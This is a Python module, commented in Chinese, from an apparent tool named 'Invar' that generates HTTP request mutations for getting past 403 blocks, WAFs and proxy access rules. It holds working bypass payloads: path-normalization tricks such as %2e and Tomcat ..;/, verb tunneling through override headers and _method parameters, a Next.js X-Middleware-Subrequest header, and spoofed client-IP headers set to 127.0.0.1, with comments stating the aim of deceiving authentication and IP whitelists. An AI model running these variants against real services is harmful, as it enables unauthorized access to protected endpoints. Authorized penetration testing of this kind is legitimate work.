from __future__ import annotations
from dataclasses import asdict, dataclass, field
from enum import Enum
import hashlib
from typing import Any, Dict, List, Optional, Set
from urllib.parse import parse_qsl, urlencode, urlparse, urlunsplit


class TransformationFamily(str, Enum):
    """
    Invar 9 大核心变换族（对齐规格书与 RFC 3986/9110 规范）
    """
    F1_PATH_NORMALIZATION = "F1_PATH_NORMALIZATION"
    F2_METHOD_SEMANTICS = "F2_METHOD_SEMANTICS"
    F3_HEADER_TRUST_CONTEXT = "F3_HEADER_TRUST_CONTEXT"
    F4_HOST_AUTHORITY_SCHEME = "F4_HOST_AUTHORITY_SCHEME"
    F5_ENCODING_DECODING = "F5_ENCODING_DECODING"
    F6_QUERY_BODY_PARSER = "F6_QUERY_BODY_PARSER"
    F7_PROTOCOL_WIRE = "F7_PROTOCOL_WIRE"
    F8_CACHE_ROUTING = "F8_CACHE_ROUTING"
    F9_SESSION_AUTH = "F9_SESSION_AUTH"


@dataclass(frozen=True)
class TransformationVariant:
    """
    独立且不可变的物理变异请求实体
    """
    variant_id: str
    family: TransformationFamily
    method: str
    url: str
    headers: Dict[str, str] = field(default_factory=dict)
    payload: Dict[str, Any] = field(default_factory=dict)
    rationale: str = ""
    expected_effect: str = ""

    def to_dict(self) -> Dict[str, Any]:
        data = asdict(self)
        data["family"] = self.family.value
        return data


class TransformationFamilyRegistry:
    """
    Invar 变换族算子库注册与生成中枢
    融合业界前沿实战词表（nomore403 / NoMoreForbidden / HackTricks 2025-2026）
    """
    TRUST_IP_PAYLOADS: List[str] = [
        "127.0.0.1",
        "127.0.0.1:80",
        "http://127.0.0.1",
    ]

    VERB_TUNNEL_HEADERS: List[str] = [
        "X-HTTP-Method-Override",
        "X-Method-Override",
        "X-HTTP-Method",
        "X-Original-Method",
    ]

    @classmethod
    def _rebuild_url(cls, parsed_url, new_path: str, new_query: Optional[str] = None) -> str:
        q = new_query if new_query is not None else parsed_url.query
        return urlunsplit((
            parsed_url.scheme,
            parsed_url.netloc,
            new_path,
            q,
            parsed_url.fragment,
        ))

    @classmethod
    def generate_f1_path_variants(
        cls,
        url: str,
        method: str,
        headers: Dict[str, str],
        payload: Dict[str, Any],
    ) -> List[TransformationVariant]:
        """
        【F1 路径规范化差异族】
        收录: %2e, %2e%2e, /., //, /./, %20, %09, ?, #, /*, 后缀混淆, Tomcat 分号 ..;/ 等
        """
        parsed = urlparse(url)
        path = parsed.path or "/"
        clean_p = path.lstrip('/')
        variants: List[TransformationVariant] = []

        # 1. 点斜杠与多斜杠解析差异 (Dot-Segment & Slash Normalization)
        dot_mutations = [
            (f"/%2e/{clean_p}", "PATH_PERCENT_DOT", "利用前后端对 URL 编码点号 %2e 解码阶段的差异"),
            (f"/%2e%2e/{clean_p}", "PATH_PERCENT_DOUBLE_DOT", "利用前后端对双点号 %2e%2e 规范化解码的差异"),
            (f"{path}/.", "PATH_TRAILING_DOT_SLASH", "利用路径末端目录标记 /. 扰动路由前缀匹配"),
            (f"//{clean_p}//", "PATH_DUAL_SLASH", "连续双斜杠 // 探查反向代理与容器的斜杠合并策略"),
            (f"/./{clean_p}/./", "PATH_DOT_SLASH_WRAPPED", "用 /./ 环绕真实路径绕过精确黑名单"),
            (f"{path}..;/", "PATH_TOMCAT_SEMICOLON_TRAVERSAL", "Tomcat 经典 ..;/ 分号参数截断与目录跨越"),
            (f"{path};/", "PATH_SEMICOLON_ROOT", "分号矩阵参数后置，测试中间件是否忽略后续字符"),
        ]
        if not path.endswith("/"):
            dot_mutations.append((f"{path}/", "PATH_TRAILING_SLASH", "尾部追加斜杠探测反代目录匹配分流差异"))

        for mutated_path, vid, rat in dot_mutations:
            variants.append(TransformationVariant(
                variant_id=f"F1_{vid}",
                family=TransformationFamily.F1_PATH_NORMALIZATION,
                method=method,
                url=cls._rebuild_url(parsed, mutated_path),
                headers=dict(headers),
                payload=dict(payload),
                rationale=rat,
                expected_effect="绕过反向代理基于字符串字面的路径阻断",
            ))

        # 2. 空白字符与控制符截断
        whitespace_mutations = [
            (f"{path}%20", "PATH_TRAILING_SPACE", "尾部追加 URL 编码空格 %20"),
            (f"{path}%09", "PATH_TRAILING_TAB", "尾部追加 URL 编码水平制表符 %09"),
        ]
        for mutated_path, vid, rat in whitespace_mutations:
            variants.append(TransformationVariant(
                variant_id=f"F1_{vid}",
                family=TransformationFamily.F1_PATH_NORMALIZATION,
                method=method,
                url=cls._rebuild_url(parsed, mutated_path),
                headers=dict(headers),
                payload=dict(payload),
                rationale=rat,
                expected_effect="依赖容器对文件名或路径尾部空白的自动裁剪机制",
            ))

        # 3. 查询分隔符与伪参数 (Query / Fragment Injection)
        query_mutations = [
            (f"{path}?", "PATH_EMPTY_QUERY", "尾部注入问号形成空 Query 改变 URI 解析树"),
            (f"{path}/?anything", "PATH_DUMMY_QUERY", "注入假查询参数绕过静态黑名单匹配"),
            (f"{path}#", "PATH_FRAGMENT_ANCHOR", "注入客户端锚点符号 # 截断服务端路径感知"),
            (f"{path}/*", "PATH_WILDCARD", "尾部追加通配符 /* 探测模糊路由分派"),
        ]
        for mutated_path, vid, rat in query_mutations:
            variants.append(TransformationVariant(
                variant_id=f"F1_{vid}",
                family=TransformationFamily.F1_PATH_NORMALIZATION,
                method=method,
                url=cls._rebuild_url(parsed, mutated_path),
                headers=dict(headers),
                payload=dict(payload),
                rationale=rat,
                expected_effect="改变 URI 结构分类，混淆 WAF 的正则表达式",
            ))

        # 4. 后缀与表征扩展名混淆 (Extension / Representation Confusion)
        ext_mutations = [
            (f"{path}.json", "EXT_JSON", "请求伪静态 .json 拓展名，探测内容协商与路由解耦"),
            (f"{path}.html", "EXT_HTML", "请求伪静态 .html 拓展名，绕过针对 API 路径的阻断"),
            (f"{path}.php", "EXT_PHP", "探测旧式 FastCGI 或伪静态后缀透传"),
            (f"{path}.action", "EXT_ACTION", "探测 Struts/Java 框架动作后缀透传"),
        ]
        for mutated_path, vid, rat in ext_mutations:
            variants.append(TransformationVariant(
                variant_id=f"F1_{vid}",
                family=TransformationFamily.F1_PATH_NORMALIZATION,
                method=method,
                url=cls._rebuild_url(parsed, mutated_path),
                headers=dict(headers),
                payload=dict(payload),
                rationale=rat,
                expected_effect="匹配网关静态资源放行白名单，但由后端框架完整处理",
            ))

        return variants

    @classmethod
    def generate_f2_method_variants(
        cls,
        url: str,
        method: str,
        headers: Dict[str, str],
        payload: Dict[str, Any],
        target_verb: Optional[str] = None,
    ) -> List[TransformationVariant]:
        """
        【F2 动词语义与隧道穿透族】
        收录: POST 空载荷降级、TRACE 动词、HEAD 探测、X-HTTP-Method-Override 头隧道与 Query 动词
        """
        effective_target = (target_verb or method).upper()
        variants: List[TransformationVariant] = []

        # 1. POST 协议降级变体 (Content-Length: 0)
        post_headers = dict(headers)
        post_headers["Content-Length"] = "0"
        variants.append(TransformationVariant(
            variant_id="F2_POST_EMPTY_BODY",
            family=TransformationFamily.F2_METHOD_SEMANTICS,
            method="POST",
            url=url,
            headers=post_headers,
            payload={},
            rationale="使用 POST 伴随 Content-Length: 0 发起探测，绕过仅针对 GET 的拦截策略",
            expected_effect="以非缓存、状态变更语义迫使后端放行",
        ))

        # 2. 诊断动词探测变体 (TRACE / HEAD)
        variants.append(TransformationVariant(
            variant_id="F2_VERB_TRACE",
            family=TransformationFamily.F2_METHOD_SEMANTICS,
            method="TRACE",
            url=url,
            headers=dict(headers),
            payload=dict(payload),
            rationale="发送 RFC 标准 TRACE 动词探查边缘代理是否回显或未设防",
            expected_effect="利用代理对诊断动词的盲区实现透传",
        ))
        variants.append(TransformationVariant(
            variant_id="F2_VERB_HEAD",
            family=TransformationFamily.F2_METHOD_SEMANTICS,
            method="HEAD",
            url=url,
            headers=dict(headers),
            payload=dict(payload),
            rationale="发送 HEAD 动词探查应用是否仅拦截正文返回但放行元数据",
            expected_effect="探查不敏感动词放行状态",
        ))

        # 3. HTTP 动词隧道头 (Header Verb Tunneling - 吸收社区主流标准)
        for h_name in cls.VERB_TUNNEL_HEADERS:
            h_tunnel = dict(headers)
            h_tunnel[h_name] = effective_target
            variants.append(TransformationVariant(
                variant_id=f"F2_HEADER_TUNNEL_{h_name.upper().replace('-', '_')}",
                family=TransformationFamily.F2_METHOD_SEMANTICS,
                method="POST" if effective_target != "POST" else "GET",
                url=url,
                headers=h_tunnel,
                payload=dict(payload),
                rationale=f"载荷动词置于载体请求中，通过隧道头 [{h_name}] 穿透 WAF",
                expected_effect="前端看到的是普通动词，后端中间件将其还原为目标动词",
            ))

        # 4. URL 查询参数动词隧道 (Query Verb Tunneling)
        parsed = urlparse(url)
        delimiter = "&" if parsed.query else "?"
        for q_param in ["_method", "method"]:
            tampered_url = f"{url}{delimiter}{q_param}={effective_target}"
            variants.append(TransformationVariant(
                variant_id=f"F2_QUERY_TUNNEL_{q_param.upper()}",
                family=TransformationFamily.F2_METHOD_SEMANTICS,
                method="POST",
                url=tampered_url,
                headers=dict(headers),
                payload=dict(payload),
                rationale=f"通过 URL 查询参数 [{q_param}] 声明目标动词",
                expected_effect="触发 Web 框架内置的 MethodFilter 动词重写",
            ))

        return variants

    @classmethod
    def generate_f3_header_trust_variants(
        cls,
        url: str,
        method: str,
        headers: Dict[str, str],
        payload: Dict[str, Any],
    ) -> List[TransformationVariant]:
        """
        【F3 代理头与信任上下文族】
        收录: X-Original-URL, X-Rewrite-URL, X-Forwarded-Prefix, Cloudflare/Akamai 真实 IP 头, RFC 7239 Forwarded 等
        """
        parsed = urlparse(url)
        target_path = parsed.path or "/"
        root_url = cls._rebuild_url(parsed, "/")
        variants: List[TransformationVariant] = []

        # 1. 代理路径重写头 (X-Original-URL / X-Rewrite-URL / X-Forwarded-Prefix)
        rewrite_headers = [
            ("X-Original-URL", "X_ORIGINAL_URL", target_path),
            ("X-Rewrite-URL", "X_REWRITE_URL", target_path),
            ("X-rewrite-url", "X_REWRITE_URL_LOWER", target_path),
            ("X-Forwarded-Prefix", "X_FORWARDED_PREFIX", target_path),
        ]
        for h_rewrite, vid_suffix, h_val in rewrite_headers:
            rw_headers = dict(headers)
            rw_headers[h_rewrite] = h_val
            variants.append(TransformationVariant(
                variant_id=f"F3_REWRITE_{vid_suffix}",
                family=TransformationFamily.F3_HEADER_TRUST_CONTEXT,
                method=method,
                url=root_url,
                headers=rw_headers,
                payload=dict(payload),
                rationale=f"请求根路由 '/'，通过 [{h_rewrite}: {h_val}] 探查后端内部路由重写与前缀剥离",
                expected_effect="前端放行根路由，后端内部转发到目标保护端点",
            ))

        # 2. 现代云原生中间件穿透头 (Next.js / Nginx Accel)
        mw_headers = dict(headers)
        mw_headers["X-Middleware-Subrequest"] = "1"
        variants.append(TransformationVariant(
            variant_id="F3_NEXTJS_MIDDLEWARE_SUBREQUEST",
            family=TransformationFamily.F3_HEADER_TRUST_CONTEXT,
            method=method,
            url=url,
            headers=mw_headers,
            payload=dict(payload),
            rationale="注入 Next.js / Edge 网关内部子请求标记头 X-Middleware-Subrequest: 1",
            expected_effect="欺骗边缘中间件跳过外部路由鉴权守卫",
        ))

        # 3. 全量主流 CDN & 反代客户端真实 IP 伪装头 (nomore403 / NoMoreForbidden 规则汇集)
        ip_headers = [
            ("X-Custom-IP-Authorization", "X_CUSTOM_IP_AUTH"),
            ("X-Forwarded-For", "X_FORWARDED_FOR"),
            ("X-Host", "X_HOST"),
            ("X-Forwarded-Host", "X_FORWARDED_HOST"),
            ("X-Forwarded-Server", "X_FORWARDED_SERVER"),
            ("X-Remote-IP", "X_REMOTE_IP"),
            ("X-Client-IP", "X_CLIENT_IP"),
            ("X-Real-IP", "X_REAL_IP"),
            ("X-Original-Remote-Addr", "X_ORIGINAL_REMOTE_ADDR"),
            ("CF-Connecting-IP", "CF_CONNECTING_IP"),
            ("True-Client-IP", "TRUE_CLIENT_IP"),
        ]

        for h_name, vid_prefix in ip_headers:
            for ip_val in cls.TRUST_IP_PAYLOADS:
                h_spoof = dict(headers)
                h_spoof[h_name] = ip_val
                if ip_val.startswith("http://"):
                    clean_val_id = "HTTP_" + ip_val.replace("http://", "").replace(":", "_").replace(".", "_")
                elif ":" in ip_val:
                    clean_val_id = ip_val.replace(":", "_PORT_").replace(".", "_")
                else:
                    clean_val_id = ip_val.replace(".", "_")

                variants.append(TransformationVariant(
                    variant_id=f"F3_{vid_prefix}_{clean_val_id}",
                    family=TransformationFamily.F3_HEADER_TRUST_CONTEXT,
                    method=method,
                    url=url,
                    headers=h_spoof,
                    payload=dict(payload),
                    rationale=f"向请求头注入内网信任凭证 [{h_name}: {ip_val}]",
                    expected_effect="欺骗应用层的客户端 IP 校验，命中内部管理白名单",
                ))

        # 4. RFC 7239 标准 Forwarded 标头
        h_rfc_forwarded = dict(headers)
        h_rfc_forwarded["Forwarded"] = "for=127.0.0.1;proto=https;by=127.0.0.1"
        variants.append(TransformationVariant(
            variant_id="F3_RFC7239_FORWARDED",
            family=TransformationFamily.F3_HEADER_TRUST_CONTEXT,
            method=method,
            url=url,
            headers=h_rfc_forwarded,
            payload=dict(payload),
            rationale="注入 RFC 7239 标准多字段代理头 Forwarded: for=127.0.0.1;proto=https;by=127.0.0.1",
            expected_effect="命中遵循 RFC 标准的反向代理内部来源放行规则",
        ))

        return variants

    @classmethod
    def generate_all(
        cls,
        url: str,
        method: str,
        headers: Optional[Dict[str, str]] = None,
        payload: Optional[Dict[str, Any]] = None,
        target_verb: Optional[str] = None,
        families: Optional[Set[TransformationFamily]] = None,
    ) -> List[TransformationVariant]:
        """
        组合生成器：一键生成各家族变异体并执行去重对账
        """
        h = dict(headers or {})
        p = dict(payload or {})
        active_families = families or {
            TransformationFamily.F1_PATH_NORMALIZATION,
            TransformationFamily.F2_METHOD_SEMANTICS,
            TransformationFamily.F3_HEADER_TRUST_CONTEXT,
        }

        variants: List[TransformationVariant] = []
        if TransformationFamily.F1_PATH_NORMALIZATION in active_families:
            variants.extend(cls.generate_f1_path_variants(url, method, h, p))
        if TransformationFamily.F2_METHOD_SEMANTICS in active_families:
            variants.extend(cls.generate_f2_method_variants(url, method, h, p, target_verb=target_verb))
        if TransformationFamily.F3_HEADER_TRUST_CONTEXT in active_families:
            variants.extend(cls.generate_f3_header_trust_variants(url, method, h, p))

        # 确定性去重：依据 (method, url, headers_fingerprint) 保持纯净
        seen: Set[str] = set()
        deduped: List[TransformationVariant] = []
        for v in variants:
            h_str = "|".join(f"{k}:{v.headers[k]}" for k in sorted(v.headers.keys()))
            fp = f"{v.method}:{v.url}:{h_str}"
            if fp not in seen:
                seen.add(fp)
                deduped.append(v)

        return deduped
